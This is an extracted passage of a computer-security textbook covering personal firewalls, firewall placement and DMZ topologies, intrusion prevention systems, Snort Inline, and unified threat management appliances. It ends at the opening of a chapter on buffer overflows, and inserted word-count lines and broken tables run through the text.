wall functionality can be used in the home environment and on corporate intranets. 
Typically, the personal firewall is a software module on the personal computer. In 
a home environment with multiple computers connected to the Internet, firewall 
functionality can also be housed in a router that connects all of the home computers 
to a DSL, cable modem, or other Internet interface.
[Word Count: 88]

Personal firewalls are typically much less complex than either server-based 
firewalls or stand-alone firewalls. The primary role of the personal firewall is to 
deny unauthorized remote access to the computer. The firewall can also monitor 
outgoing activity in an attempt to detect and block worms and other malware.
[Word Count: 48]

Personal firewall capabilities are provided by the netfilter package on Linux 
systems, or the pf package on BSD and Mac OS X systems. These packages may be 
configured on the command-line, or with a GUI front-end. When such a personal 
firewall is enabled, all inbound connections are usually denied except for those 
the user explicitly permits. Outbound connections are usually allowed. The list of 
inbound services that can be selectively re-enabled, with their port numbers, may 
include the following common services:
[Word Count: 81]

• Personal file sharing (548, 427)
 
• Windows sharing (139)
 
• Personal Web sharing (80, 427)
 
• Remote login—SSH (22)
 
• FTP access (20-21, 1024-65535 from 20-21)
 
• Printer sharing (631, 515)
[Word Count: 32]

• IChat Rendezvous (5297, 5298)
 
• ITunes Music Sharing (3869)
 
• CVS (2401)
 
• Gnutella/Limewire (6346)
 
• ICQ (4000)
 
• IRC (194)
 
• MSN Messenger (6891-6900)
 
• Network Time (123)
[Word Count: 30]

9.5 / Firewall Location and Configurations   317
[Word Count: 7]

• Retrospect (497)
 
• SMB (without netbios–445)
 
• VNC (5900-5902)
 
• WebSTAR Admin (1080, 1443)
[Word Count: 15]

When FTP access is enabled, ports 20 and 21 on the local machine are opened 
for FTP; if others connect to this computer from ports 20 or 21, the ports 1024 
through 65535 are open.
[Word Count: 35]

For increased protection, advanced firewall features may be configured. For 
example, stealth mode hides the system on the Internet by dropping unsolicited 
communication packets, making it appear as though the system is not present. 
UDP packets can be blocked, restricting network traffic to TCP packets only for 
open ports. The firewall also supports logging, an important tool for checking on 
unwanted activity. Other types of personal firewall allow the user to specify that 
only selected applications, or applications signed by a valid certificate authority, 
may provide services accessed from the network.
[Word Count: 91]

9.5	 Firewall Location and Configurations
[Word Count: 5]

As Figure 9.1a indicates, a firewall is positioned to provide a protective bar-
rier between an external (potentially untrusted) source of traffic and an internal 
­network. With that general principle in mind, a security administrator must decide 
on the location and on the number of firewalls needed. In this section, we look at 
some common options.
[Word Count: 56]

The external firewall provides a measure of access control and protection for 
the DMZ systems consistent with their need for external connectivity. The external 
firewall also provides a basic level of protection for the remainder of the enterprise 
network. In this type of configuration, internal firewalls serve three purposes:
[Word Count: 49]

1.	 The internal firewall adds more stringent filtering capability, compared to the
[Word Count: 12]

external firewall, in order to protect enterprise servers and workstations from 
external attack.
	
2.	 The internal firewall provides two-way protection with respect to the DMZ.
[Word Count: 25]

First, the internal firewall protects the remainder of the network from attacks
[Word Count: 12]

318    Chapter 9 / Firewalls and Intrusion Prevention Systems
[Word Count: 9]

Figure 9.2  Example Firewall Configuration
[Word Count: 5]

launched from DMZ systems. Such attacks might originate from worms, ­rootkits, 
bots, or other malware lodged in a DMZ system. Second, an internal firewall 
can protect the DMZ systems from attack from the internal protected network.
	
3.	 Multiple internal firewalls can be used to protect portions of the internal
[Word Count: 49]

­network from each other. Figure 8.5 (network intrusion detection system) 
shows a configuration in which the internal servers are protected from internal 
workstations and vice versa. It also illustrates the common practice of placing
[Word Count: 34]

9.5 / Firewall Location and Configurations   319
[Word Count: 7]

the DMZ on a different network interface on the external firewall from that 
used to access the internal networks.
[Word Count: 19]

A logical means of implementing an IPSec is in a firewall, as shown in  
Figure 9.3. If IPSec is implemented in a separate box behind (internal to) the fire-
wall, then VPN traffic passing through the firewall in both directions is encrypted. 
In this case, the firewall is unable to perform its filtering function or other security 
functions, such as access control, logging, or scanning for viruses. IPSec could be 
implemented in the boundary router, outside the firewall. However, this device is 
likely to be less secure than the firewall and thus less desirable as an IPSec ­platform.
[Word Count: 98]

1Details of IPSec are provided in Chapter 22. For this discussion, all that we need to know is that IPSec 
adds one or more additional headers to the IP packet to support encryption and authentication functions.
[Word Count: 36]

320    Chapter 9 / Firewalls and Intrusion Prevention Systems
[Word Count: 9]

A distributed firewall configuration involves stand-alone firewall devices plus host-
based firewalls working together under a central administrative control. Figure 9.4 
suggests a distributed firewall configuration. Administrators can configure host- 
r­esident firewalls on hundreds of servers and workstation as well as configure 
­personal firewalls on local and remote user systems. Tools let the network admin-
istrator set policies and monitor security across the entire network. These firewalls 
protect against internal attacks and provide protection tailored to specific machines 
and applications. Stand-alone firewalls provide global protection, including internal 
firewalls and an external firewall, as discussed previously.
[Word Count: 95]

With distributed firewalls, it may make sense to establish both an internal and an 
external DMZ. Web servers that need less protection because they have less critical 
information on them could be placed in an external DMZ, outside the ­external fire-
wall. What protection is needed is provided by host-based firewalls on these servers.
[Word Count: 54]

An important aspect of a distributed firewall configuration is security 
­monitoring. Such monitoring typically includes log aggregation and analysis, ­firewall 
statistics, and fine-grained remote monitoring of individual hosts if needed.
[Word Count: 30]

Summary of Firewall Locations and Topologies
[Word Count: 6]

We can now summarize the discussion from Sections 9.4 and 9.5 to define a spectrum 
of firewall locations and topologies. The following alternatives can be identified:
[Word Count: 26]

• Host-resident firewall: This category includes personal firewall software and
[Word Count: 10]

firewall software on servers. Such firewalls can be used alone or as part of an 
in-depth firewall deployment.
[Word Count: 18]

Plain IP packet
Firewall
with IPSec
IP
payload
[Word Count: 8]

9.5 / Firewall Location and Configurations   321
[Word Count: 7]

• Screening router: A single router between internal and external networks with 
stateless or full packet filtering. This arrangement is typical for small office/
home office (SOHO) applications.
 
• Single bastion inline: A single firewall device between an internal and exter-
nal router (e.g., Figure 9.1a). The firewall may implement stateful filters and/
[Word Count: 53]

Figure 9.4  Example Distributed Firewall Configuration
[Word Count: 6]

322    Chapter 9 / Firewalls and Intrusion Prevention Systems
[Word Count: 9]

or application proxies. This is the typical firewall appliance configuration for 
small to medium-sized organizations.
 
• Single bastion T: Similar to single bastion inline but has a third network inter-
[Word Count: 30]

face on bastion to a DMZ where externally visible servers are placed. Again, 
this is a common appliance configuration for medium to large organizations.
 
• Double bastion inline: Figure 9.2 illustrates this configuration, where the
[Word Count: 35]

DMZ is sandwiched between bastion firewalls. This configuration is common 
for large businesses and government organizations.
 
• Double bastion T: Figure 8.5 illustrates this configuration. The DMZ is on
[Word Count: 29]

a ­separate network interface on the bastion firewall. This configuration is 
also common for large businesses and government organizations and may 
be required.
 
• Distributed firewall configuration: Illustrated in Figure 9.4. This configuration
[Word Count: 33]

is used by some large businesses and government organizations.
[Word Count: 9]

A further addition to the range of security products is the intrusion prevention sys-
tem (IPS), also known as intrusion detection and prevention system (IDPS). It is 
an extension of an IDS that includes the capability to attempt to block or prevent 
detected malicious activity. Like an IDS, an IPS can be host-based, network-based, 
or distributed/hybrid, as we discuss in Chapter 8. Similarly, it can use anomaly 
detection to identify behavior that is not that of legitimate users, or signature/heu-
ristic detection to identify known malicious behavior.
[Word Count: 87]

Once an IDS has detected malicious activity, it can respond by modifying 
or blocking network packets across a perimeter or into a host, or by modifying or 
blocking system calls by programs running on a host. Thus, a network IPS can block 
traffic, as a firewall does, but makes use of the types of algorithms developed for 
IDSs to determine when to do so. It is a matter of terminology whether a network 
IPS is considered a separate, new type of product or simply another form of firewall.
[Word Count: 88]

A host-based IPS (HIPS) can make use of either signature/heuristic or anomaly 
detection techniques to identify attacks. In the former case, the focus is on the spe-
cific content of application network traffic, or of sequences of system calls, looking 
for patterns that have been identified as malicious. In the case of anomaly detection, 
the IPS is looking for behavior patterns that indicate malware. Examples of the 
types of malicious behavior addressed by a HIPS include the following:
[Word Count: 78]

• Modification of system resources: Rootkits, Trojan horses, and backdoors
[Word Count: 10]

­operate by changing system resources, such as libraries, directories, registry 
settings, and user accounts.
 
• Privilege-escalation exploits: These attacks attempt to give ordinary users
[Word Count: 24]

9.6 / Intrusion Prevention Systems   323
[Word Count: 6]

• Buffer-overflow exploits: These attacks are described in Chapter 10.
 
• Access to e-mail contact list: Many worms spread by mailing a copy of them-
[Word Count: 25]

selves to addresses in the local system’s e-mail address book.
 
• Directory traversal: A directory traversal vulnerability in a Web server allows
[Word Count: 22]

the hacker to access files outside the range of what a server application user 
would normally need to access.
[Word Count: 19]

Attacks such as these result in behaviors that can be analyzed by a HIPS. The 
HIPS capability can be tailored to the specific platform. A set of general-purpose 
tools may be used for a desktop or server system. Some HIPS packages are designed 
to protect specific types of servers, such as Web servers and database servers. In this 
case, the HIPS looks for particular application attacks.
[Word Count: 66]

In addition to signature and anomaly-detection techniques, a HIPS can use 
a sandbox approach. Sandboxes are especially suited to mobile code, such as Java 
applets and scripting languages. The HIPS quarantines such code in an isolated sys-
tem area, then runs the code and monitors its behavior. If the code violates prede-
fined policies or matches predefined behavior signatures, it is halted and prevented 
from executing in the normal system environment.
[Word Count: 71]

[ROBB06a] lists the following as areas for which a HIPS typically offers desk-
top protection:
[Word Count: 15]

• System calls: The kernel controls access to system resources such as memory,
[Word Count: 13]

I/O devices, and processor. To use these resources, user applications invoke 
system calls to the kernel. Any exploit code will execute at least one system 
call. The HIPS can be configured to examine each system call for malicious 
characteristics.
 
• File system access: The HIPS can ensure that file access system calls are not
[Word Count: 54]

malicious and meet established policy.
 
• System registry settings: The registry maintains persistent configuration infor-
[Word Count: 15]

mation about programs and is often maliciously modified to extend the life 
of an exploit. The HIPS can ensure that the system registry maintains its 
­integrity.
 
• Host input/output: I/O communications, whether local or network based,
[Word Count: 36]

can propagate exploit code and malware. The HIPS can examine and en-
force proper client interaction with the network and its interaction with other 
­devices.
[Word Count: 25]

The Role of Hips  Many industry observers see the enterprise endpoint, including 
desktop and laptop systems, as now the main target for hackers and criminals, more 
so than network devices [ROBB06b]. Thus, security vendors are focusing more 
on developing endpoint security products. Traditionally, endpoint security has 
been provided by a collection of distinct products, such as antivirus, antispyware, 
antispam, and personal firewalls. The HIPS approach is an effort to provide an 
integrated, single-product suite of functions. The advantages of the integrated HIPS 
approach are that the various tools work closely together, threat prevention is more 
comprehensive, and management is easier.
[Word Count: 100]

324    Chapter 9 / Firewalls and Intrusion Prevention Systems
[Word Count: 9]

It may be tempting to think that endpoint security products such as HIPS, 
if sophisticated enough, eliminate or at least reduce the need for network-level 
devices. For example, the San Diego Supercomputer Center reports that over a 
four-year period, there were no intrusions on any of its managed machines, in a 
configuration with no firewalls and just endpoint security protection [SING03]. 
Nevertheless, a more prudent approach is to use HIPS as one element in a defense-
in-depth strategy that involves network-level devices, such as either firewalls or 
network-based IPSs.
[Word Count: 89]

A network-based IPS (NIPS) is in essence an inline NIDS with the authority to 
modify or discard packets and tear down TCP connections. As with a NIDS, a NIPS 
makes use of techniques such as signature/heuristic detection and anomaly detection.
[Word Count: 40]

Among the techniques used in a NIPS but not commonly found in a firewall 
is flow data protection. This requires that the application payload in a sequence of 
packets be reassembled. The IPS device applies filters to the full content of the flow 
every time a new packet for the flow arrives. When a flow is determined to be mali-
cious, the latest and all subsequent packets belonging to the suspect flow are dropped.
[Word Count: 74]

In terms of the general methods used by a NIPS device to identify malicious 
packets, the following are typical:
[Word Count: 19]

• Pattern matching: Scans incoming packets for specific byte sequences (the
[Word Count: 11]

signature) stored in a database of known attacks.
 
• Stateful matching: Scans for attack signatures in the context of a traffic stream
[Word Count: 22]

rather than individual packets.
 
• Protocol anomaly: Looks for deviation from standards set forth in RFCs.
 
• Traffic anomaly: Watches for unusual traffic activities, such as a flood of UDP
[Word Count: 30]

packets or a new service appearing on the network.
 
• Statistical anomaly: Develops baselines of normal traffic activity and through-
[Word Count: 20]

put, and alerts on deviations from those baselines.
[Word Count: 8]

The final category of IPS is in a distributed or hybrid approach. This gathers data 
from a large number of host and network-based sensors, relays this intelligence to 
a central analysis system able to correlate, and analyze the data, which can then 
return updated signatures and behavior patterns to enable all of the coordinated 
systems to respond and defend against malicious behavior. A number of such sys-
tems have been proposed. One of the best known is the digital immune system.
[Word Count: 81]

Digital Immune System  The digital immune system is a comprehensive defense 
against malicious behavior caused by malware, developed by IBM [KEPH97a, 
KEPH97b, WHIT99], and subsequently refined by Symantec [SYMA01]. The 
motivation for this development includes the rising threat of Internet-based 
malware, the increasing speed of its propagation provided by the Internet, and the 
need to acquire a global view of the situation.
[Word Count: 62]

9.6 / Intrusion Prevention Systems   325
[Word Count: 6]

The success of the digital immune system depends on the ability of the mal-
ware analysis system to detect new and innovative malware strains. By constantly 
analyzing and monitoring malware found in the wild, it should be possible to con-
tinually update the digital immune software to keep up with the threat.
[Word Count: 52]

Figure 9.5 shows an example of a hybrid architecture designed originally to 
detect worms [SIDI05]. The system works as follows (numbers in figure refer to 
numbers in the following list):
[Word Count: 30]

1.	 Sensors deployed at various network and host locations detect potential mal-
[Word Count: 12]

ware scanning, infection or execution. The sensor logic can also be incorpo-
rated in IDS sensors.
	
2.	 The sensors send alerts and copies of detected malware to a central server,
[Word Count: 30]

which correlates and analyzes this information. The correlation server deter-
mines the likelihood that malware is being observed and its key characteristics.
	
3.	 The server forwards its information to a protected environment, where the
[Word Count: 34]

potential malware may be sandboxed for analysis and testing.
[Word Count: 9]

4. Vulnerability 
testing and 
identiﬁcation
[Word Count: 5]

1. Malware scanning 
or infection attempts
[Word Count: 6]

Figure 9.5  Placement of Malware Monitors (adapted from [SIDI05])
[Word Count: 9]

326    Chapter 9 / Firewalls and Intrusion Prevention Systems
[Word Count: 9]

4.	 The protected system tests the suspicious software against an appropriately
[Word Count: 11]

instrumented version of the targeted application to identify the vulnerability.
	
5.	 The protected system generates one or more software patches and tests these.
	
6.	 If the patch is not susceptible to the infection and does not compromise the
[Word Count: 38]

application’s functionality, the system sends the patch to the application host 
to update the targeted application.
[Word Count: 16]

We introduced Snort in Section 8.9 as a lightweight intrusion detection system. A 
modified version of Snort, known as Snort Inline, enhances Snort to function as an 
intrusion prevention system. Snort Inline adds three new rule types that provide 
intrusion prevention features:
[Word Count: 42]

• Drop: Snort rejects a packet based on the options defined in the rule and logs
[Word Count: 16]

the result.
 
• Reject: Snort rejects a packet and logs the result. In addition, an error mes-
[Word Count: 17]

sage is returned. In the case of TCP, this is a TCP reset message, which resets 
the TCP connection. In the case of UDP, an ICMP port unreachable message 
is sent to the originator of the UDP packet.
 
• Sdrop: Snort rejects a packet but does not log the packet.
[Word Count: 50]

Snort Inline also includes a replace option, which allows the Snort user to 
modify packets rather than drop them. This feature is useful for a honeypot imple-
mentation [SPIT03]. Instead of blocking detected attacks, the honeypot modifies 
and disables them by modifying packet content. Attackers launch their exploits, 
which travel the Internet and hit their intended targets, but Snort Inline disables 
the attacks, which ultimately fail. The attackers see the failure but cannot figure out 
why it occurred. The honeypot can continue to monitor the attackers while reducing 
the risk of harming remote systems.
[Word Count: 94]

9.7	 Example: Unified Threat Management Products
[Word Count: 6]

In the past few chapters, we have reviewed a number of approaches to countering  
malicious software and network-based attacks, including antivirus and antiworm 
products, IPS and IDS, and firewalls. The implementation of all of these systems can 
provide an organization with a defense in depth using multiple layers of ­filters and 
defense mechanisms to thwart attacks. The downside of such a piecemeal implementa-
tion is the need to configure, deploy, and manage a range of devices and ­software pack-
ages. In addition, deploying a number of devices in sequence can reduce ­performance.
[Word Count: 92]

One approach to reducing the administrative and performance burden is to 
replace all inline network products (firewall, IPS, IDS, VPN, antispam, antisypware, 
and so on) with a single device that integrates a variety of approaches to dealing 
with network-based attacks. The market analyst firm IDC refers to such a device as 
a unified threat management (UTM) system and defines UTM as follows: “Products
[Word Count: 63]

9.7 / Example: Unified Threat Management Products   327
[Word Count: 8]

that include multiple security features integrated into one box. To be included in 
this category, [an appliance] must be able to perform network firewalling, network 
intrusion detection and prevention and gateway anti-virus. All of the capabilities in 
the appliance need not be used concurrently, but the functions must exist inherently 
in the appliance.”
[Word Count: 53]

A significant issue with a UTM device is performance, both throughput and 
latency. [MESS06] reports that typical throughput losses for current commer-
cial devices is 50% Thus, customers are advised to get very high-performance, 
­high-throughput devices to minimize the apparent performance degradation.
[Word Count: 42]

Figure 9.6 is a typical UTM appliance architecture. The following functions 
are noteworthy:
[Word Count: 13]

1.	 Inbound traffic is decrypted if necessary before its initial inspection. If the de-
[Word Count: 14]

vice functions as a VPN boundary node, then IPSec decryption would take 
place here.
[Word Count: 14]

Figure 9.6  Unified Threat Management Appliance
[Word Count: 6]

328    Chapter 9 / Firewalls and Intrusion Prevention Systems
[Word Count: 9]

2.	 An initial firewall module filters traffic, discarding packets that violate rules
[Word Count: 12]

and/or passing packets that conform to rules set in the firewall policy.
	
3.	 Beyond this point, a number of modules process individual packets and flows
[Word Count: 25]

of packets at various protocols levels. In this particular configuration, a data 
analysis engine is responsible for keeping track of packet flows and coordinat-
ing the work of antivirus, IDS, and IPS engines.
	
4.	 The data analysis engine also reassembles multipacket payloads for content
[Word Count: 44]

analysis by the antivirus engine and the Web filtering and antispam ­modules.
	
5.	 Some incoming traffic may need to be reencrypted to maintain security of the
[Word Count: 26]

flow within the enterprise network.
	
6.	 All detected threats are reported to the logging and reporting module, which
[Word Count: 18]

is used to issue alerts for specified conditions and for forensic analysis.
	
7.	 The bandwidth-shaping module can use various priority and quality-of-service
[Word Count: 22]

(QoS) algorithms to optimize performance.
[Word Count: 5]

As an example of the scope of a UTM appliance, Tables 9.3 and 9.4. lists some 
of the attacks that the UTM device marketed by Secure Computing is designed to 
counter.
[Word Count: 31]

Table 9.3  Sidewinder G2 Security Appliance Attack Protections Summary—Transport-Level Examples
[Word Count: 10]

Attacks and Internet Threats
Protections
[Word Count: 5]

• Invalid port numbers
• Invalid sequence
• Numbers
• SYN floods
• XMAS tree attacks
• Invalid CRC values
• Zero length
• Random data as TCP
• Header
[Word Count: 30]

• TCP hijack attempts
• TCP spoofing attacks
• Small PMTU attacks
• SYN attack
• Script Kiddie attacks
• Packet crafting:
[Word Count: 22]

inside and one of the 
outside
• Enforce correct TCP
[Word Count: 10]

ensuring correctness
• Properly handles TCP
[Word Count: 6]

timeouts and retrans-
mits timers
• All TCP proxies are
[Word Count: 10]

through access lists
• Drop TCP packets on
[Word Count: 8]

• Connection pediction
• UDP port scanning
[Word Count: 7]

• Verify correct UDP packet
• Drop UDP packets on ports not open
[Word Count: 13]

9.7 / Example: Unified Threat Management Products   329
[Word Count: 8]

Table 9.4  Sidewinder G2 Security Appliance Attack Protections Summary—Application-Level
[Word Count: 9]

Attacks and Internet Threats
Protections
[Word Count: 5]

Incorrect NXDOMAIN responses from AAAA 
queries could cause denial-of-service conditions.
[Word Count: 10]

• Does not allow negative caching
• Prevents DNS cache poisoning
[Word Count: 11]

ISC BIND 9 before 9.2.1 allows remote attackers 
to cause a denial of service (shutdown) via a mal-
formed DNS packet that triggers an error condi-
tion that is not properly handled when the rdataset 
parameter to the dns_message_findtype() function 
in message.c is not NULL.
[Word Count: 45]

• Sidewinder G2 prevents malicious use of ­improperly
[Word Count: 8]

formed DNS messages to affect ­firewall operations.
• Prevents DNS query attacks
• Prevents DNS answer attacks
[Word Count: 17]

DNS information prevention and other DNS 
abuses.
[Word Count: 7]

• Prevent zone transfers and queries
• True split DNS protect by Type Enforcement
[Word Count: 14]

­technology to allow public and private DNS zones.
• Ability to turn off recursion
[Word Count: 14]

• FTP bounce attack
• PASS attack
• FTP Port injection attacks
• TCP segmentation attack
[Word Count: 16]

• Sidewinder G2 has the ability to filter FTP commands
[Word Count: 10]

to prevent these attacks
• True network separation prevents segmentation
[Word Count: 10]

SQL Net man in the middle attacks
• Smart proxy protected by Type Enforcement
[Word Count: 14]

­technology
• Hide Internal DB through nontransparent
[Word Count: 7]

• Smart proxy protected by Type Enforcement ­technology
• Protocol validation
• Denies multicast traffic
• Checks setup and teardown methods
• Verifies PNG and RTSP protocol, discards all others
• Auxiliary port monitoring
[Word Count: 34]

• SNMP flood attacks
• Default community attack
• Brute force attack
• SNMP put attack
[Word Count: 16]

• Filter SNMP version traffic 1, 2c
• Filter Read, Write, and Notify messages
• Filter OIDS
• Filter PDU (Protocol Data Unit)
[Word Count: 23]

• Challenge Response buffer overflows
• SSHD allows users to override “Allowed
[Word Count: 12]

Authentications”
• OpenSSH buffer_append_space buffer overflow
• OpenSSH/PAM challenge Response buffer
[Word Count: 11]

overflow
• OpenSSH channel code offer-by-one
[Word Count: 6]

Sidewinder G2 v6.x’s embedded Type Enforcement 
technology strictly limits the capabilities of Secure 
Computing’s modified versions of the OpenSSH 
­daemon code.
[Word Count: 21]

330    Chapter 9 / Firewalls and Intrusion Prevention Systems
[Word Count: 9]

Attacks and Internet Threats
Protections
[Word Count: 5]

• Sendmail buffer overflows
• Sendmail denial of service attacks
• Remote buffer overflow in sendmail
• Sendmail address parsing buffer overflow
• SMTP protocol anomalies
[Word Count: 26]

• Split Sendmail architecture protected by Type
[Word Count: 7]

Enforcement technology
• Sendmail customized for controls
• Prevents buffer overflows through Type Enforcement
[Word Count: 14]

technology
• Sendmail checks SMTP protocol anomalies
[Word Count: 7]

• SMTP worm attacks
• SMTP mail flooding
• Relay attacks
• Viruses, Trojans, worms
• E-mail addressing spoofing
• MIME attacks
• Phishing e-mails
[Word Count: 25]

• Protocol validatin
• Antispam filter
• Mail filters—size, keyword
• Signature antivirus
• Antirelay
• MIME/Antivirus filter
• Firewall antivirus
• Antiphishing through virus scanning
[Word Count: 26]

• Adware used for collecting information for mar-
[Word Count: 8]

keting purposes
• Stalking horses
• Trojan horses
• Malware
• Backdoor Santas
[Word Count: 13]

• SmartFilter® URL filtering capability built in with
[Word Count: 8]

Sidewinder G2 can be configured to filter Spyware 
URLs, preventing downloads.
[Word Count: 11]

A classic treatment of firewalls is [CHES03]. [LODI98], [OPPL97], and [BELL94] 
are good overview articles on the subject. [SCAR09b] is an excellent overview of 
firewall technology and firewall policies.
[Word Count: 29]

BELL94	
Bellovin, S., and Cheswick, W. “Network Firewalls.” IEEE 
Communications Magazine, September 1994.
CHAP00	 Chapman, D., and Zwicky, E. Building Internet Firewalls. Sebastopol,
[Word Count: 23]

CA: O’Reilly, 2000.
CHES03	
Cheswick, W., and Bellovin, S. Firewalls and Internet Security: Repelling 
the Wily Hacker. Reading, MA: Addison-Wesley, 2003.
LODI98 	 Lodin, S., and Schuba, C. “Firewalls Fend Off Invasions from the
[Word Count: 34]

Net.” IEEE Spectrum, February 1998.
OPPL97	
Oppliger, R. “Internet Security: Firewalls and Beyond.” 
Communications of the ACM, May 1997.
[Word Count: 19]

9.9 / Key Terms, Review Questions, and Problems   331
[Word Count: 9]

SCAR12	
Scarfone, K., and Mell, P. Guide to Intrusion Detection and Prevention 
Systems. NIST Special Publication SP 800-94 rev 1 (draft), July 2012. 
SCAR09b  Scarfone, K., and Hoffman, P. Guidelines on Firewalls and Firewall
[Word Count: 34]

Policy. NIST Special Publication SP 800-41 rev 1, September 2009.
[Word Count: 10]

9.9	 Key Terms, Review Questions, and Problems
[Word Count: 7]

application-level gateway
bastion host
circuit-level gateway
demilitarized zone (DMZ)
distributed firewalls
firewall
host-based firewall
[Word Count: 14]

host-based IPS
intrusion prevention system
[Word Count: 5]

(IPS)
IP address spoofing
IP security (IPSec)
network-based IPS
packet filtering firewall
[Word Count: 12]

personal firewall
proxy
stateful packet inspection firewall
tiny fragment attack
unified threat management
[Word Count: 13]

9.1	
As was mentioned in Section 9.3, one approach to defeating the tiny fragment at-
tack is to enforce a minimum length of the transport header that must be contained 
in the first fragment of an IP packet. If the first fragment is rejected, all subsequent
[Word Count: 46]

332    Chapter 9 / Firewalls and Intrusion Prevention Systems
[Word Count: 9]

Table 9.5  Sample Packet Filter Firewall Ruleset
[Word Count: 7]

Source Address
Souce Port
Dest Address
Dest Port
Action
[Word Count: 9]

Rule
Direction
Src Addr
Dest Addr
Protocol
Dest Port
Action
[Word Count: 10]

B
Out
Internal
External
TCP
>1023
Permit
[Word Count: 7]

9.9 / Key Terms, Review Questions, and Problems   333
[Word Count: 9]

a.	 Describe the effect of each rule.
b.	 Your host in this example has IP address 172.16.1.1. Someone tries to send e-mail
[Word Count: 22]

from a remote host with IP address 192.168.3.4. If successful, this generates an 
SMTP dialogue between the remote user and the SMTP server on your host con-
sisting of SMTP commands and mail. Additionally, assume that a user on your host 
tries to send e-mail to the SMTP server on the remote system. Four typical packets 
for this scenario are as shown:
[Word Count: 62]

Rule
Direction
Src Addr
Dest Addr
Protocol
Src Port
Dest Port
Action
[Word Count: 12]

A
In
External
Internal
TCP
>1023
25
Permit
[Word Count: 8]

B
Out
Internal
External
TCP
25
>1023
Permit
[Word Count: 8]

C
Out
Internal
External
TCP
>1023
25
Permit
[Word Count: 8]

D
In
External
Internal
TCP
25
>1023
Permit
[Word Count: 8]

Packet
Direction
Src Addr
Dest Addr
Protocol
Dest Port
Action
[Word Count: 10]

Packet
Direction
Src Addr
Dest Addr
Protocol
Dest Port
Action
[Word Count: 10]

Indicate which packets are permitted or denied and which rule is used in each case.
c.	 Someone from the outside world (10.1.2.3) attempts to open a connection from port
[Word Count: 29]

5150 on a remote host to the Web proxy server on port 8080 on one of your local 
hosts (172.16.3.4) in order to carry out an attack. Typical packets are as ­follows:
[Word Count: 32]

a.	 Describe the change.
b.	 Apply this new rule set to the same six packets of the preceding problem. Indicate
[Word Count: 20]

which packets are permitted or denied and which rule is used in each case.
	 9.7	
A hacker uses port 25 as the client port on his or her end to attempt to open a connec-
tion to your Web proxy server.
a.	 The following packets might be generated:
[Word Count: 48]

Will the attack succeed? Give details.
	 9.6	
To provide more protection, the rule set from the preceding problem is modified as 
follows:
[Word Count: 22]

Packet
Direction
Src Addr
Dest Addr
Protocol
Src Port
Dest Port
Action
[Word Count: 12]

334    Chapter 9 / Firewalls and Intrusion Prevention Systems
[Word Count: 9]

Explain why this attack will succeed, using the rule set of the preceding ­problem.
b.	 When a TCP connection is initiated, the ACK bit in the TCP header is not set.
[Word Count: 31]

it must be relayed via the DMZ mail gateway that provides header sanitiza-
tion and content filtering. External e-mail must be destined for the DMZ mail 
server.
2.	 Users inside may retrieve their e-mail from the DMZ mail gateway, using either
[Word Count: 41]

POP3 or POP3S, and authenticate themselves.
3.	 Users outside may retrieve their e-mail from the DMZ mail gateway, but only if
[Word Count: 21]

they use the secure POP3 protocol and authenticate themselves.
4.	 Web requests (both insecure and secure) are allowed from any internal user out
[Word Count: 23]

through the firewall but must be relayed via the DMZ Web proxy, which provides 
content filtering (noting this is not possible for secure requests), and users must 
authenticate with the proxy for logging.
5.	 Web requests (both insecure and secure) are allowed from anywhere on the Internet
[Word Count: 47]

to the DMZ Web server.
6.	 DNS lookup requests by internal users are allowed via the DMZ DNS server,
[Word Count: 19]

which queries to the Internet.
7.	 External DNS requests are provided by the DMZ DNS server.
8.	 Management and update of information on the DMZ servers is allowed using ­secure
[Word Count: 30]

shell connections from relevant authorized internal users (may have different sets of 
users on each system as appropriate).
9.	 SNMP management requests are permitted from the internal management hosts
[Word Count: 29]

to the firewalls, with the firewalls also allowed to send management traps (i.e., 
notification of some event occurring) to the management hosts.
[Word Count: 22]

9.9 / Key Terms, Review Questions, and Problems   335
[Word Count: 9]

9.13	
Explain the strengths and weaknesses of each of the following firewall deployment 
scenarios in defending servers, desktop machines, and laptops against network threats.
a.	 A firewall at the network perimeter.
b.	 Firewalls on every end host machine.
c.	 A network perimeter firewall and firewalls on every end host machine
	 9.14	
Consider the example Snort rule given in Chapter 8 to detect a SYN-FIN attack. 
­Assuming this rule is used on a Snort Inline IPS, how would you modify the rule to 
block such packets entering the home network?
[Word Count: 89]

Buffer Overflow Basics
Stack Buffer Overflows
Shellcode
[Word Count: 7]

10.2  Defending Against Buffer Overflows
[Word Count: 5]

Replacement Stack Frame
Return to System Call
Heap Overflows
Global Data Area Overflows
Other Types of Overflows
[Word Count: 17]

10.5  Key Terms, Review Questions, and Problems
[Word Count: 7]

Part Two:  Software Security 
and Trusted Systems
[Word Count: 7]

After studying this chapter, you should be able to:
[Word Count: 9]

◆	Define what a buffer overflow is, and list possible consequences.
◆	Describe how a stack buffer overflow works in detail.
◆	Define shellcode and describe its use in a buffer overflow attack.
◆	List various defenses against buffer overflow attacks.
◆	List a range of other types of buffer overflow attacks.
[Word Count: 52]

We begin with an introduction to the basics of buffer overflow. Then we 
present details of the classic stack buffer overflow. This includes a discussion of 
how functions store their local variables on the stack and the consequence of 
attempting to store more data in them than there is space available. We continue 
with an overview of the purpose and design of shellcode, which is the custom code 
injected by an attacker and to which control is transferred as a result of the buffer 
overflow.
[Word Count: 85]

Next we consider ways of defending against buffer overflow attacks. We start 
with the obvious approach of preventing them by not writing code that is vulner-
able to buffer overflows in the first place. However, given the large, existing body 
of buggy code, we also need to consider hardware and software mechanisms that 
can detect and thwart buffer overflow attacks. These include mechanisms to protect 
executable address space, techniques to detect stack modifications, and approaches 
that randomize the address space layout to hinder successful execution of these 
attacks.
[Word Count: 88]

Finally, we briefly survey some of the other overflow techniques, including 
return to system call and heap overflows, and mention defenses against these.
[Word Count: 23]

Table 10.1  A Brief History of Some Buffer Overflow Attacks
[Word Count: 10]

1988
The Morris Internet Worm uses a buffer overflow exploit in “fingerd” as one of its attack 
mechanisms.
[Word Count: 18]

1995
A buffer overflow in NCSA httpd 1.3 was discovered and published on the Bugtraq 
­mailing list by Thomas Lopatic.
[Word Count: 20]

1996
Aleph One published “Smashing the Stack for Fun and Profit” in Phrack magazine, ­giving 
a step by step introduction to exploiting stack-based buffer overflow vulnerabilities.
[Word Count: 26]

2001
The Code Red worm exploits a buffer overflow in Microsoft IIS 5.0.
[Word Count: 13]

2003
The Slammer worm exploits a buffer overflow in Microsoft SQL Server 2000.
[Word Count: 13]

2004
The Sasser worm exploits a buffer overflow in Microsoft Windows 2000/XP Local 
Security Authority Subsystem Service (LSASS).
[Word Count: 18]

A buffer overflow, also known as a buffer overrun or buffer overwrite, is defined in 
the NIST Glossary of Key Information Security Terms as follows:
[Word Count: 25]

